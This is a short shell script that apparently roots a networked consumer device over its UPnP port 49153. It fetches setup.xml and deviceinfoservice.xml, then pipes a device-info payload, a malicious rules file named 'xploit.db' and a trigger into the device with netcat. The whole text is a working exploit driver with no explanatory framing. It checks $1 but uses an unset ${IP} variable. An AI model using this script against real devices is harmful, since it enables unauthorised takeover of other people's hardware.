if [ -z "$1" ]; then
	echo "Enter an IP address."
	exit 1
fi

echo "Rooting ${IP}..."

echo "Setting device state"
curl -s http://${IP}:49153/setup.xml > /dev/null
curl -s http://${IP}:49153/deviceinfoservice.xml > /dev/null
python getinfo.py | nc ${IP} 49153 > /dev/null
echo "Sending rules file"
python storerules.py xploit.db 2 | nc ${IP} 49153 > /dev/null
echo "Waiting for rules to update"
sleep 10
echo "Sending trigger"
python trigger.py | nc ${IP} 49153 > /dev/null
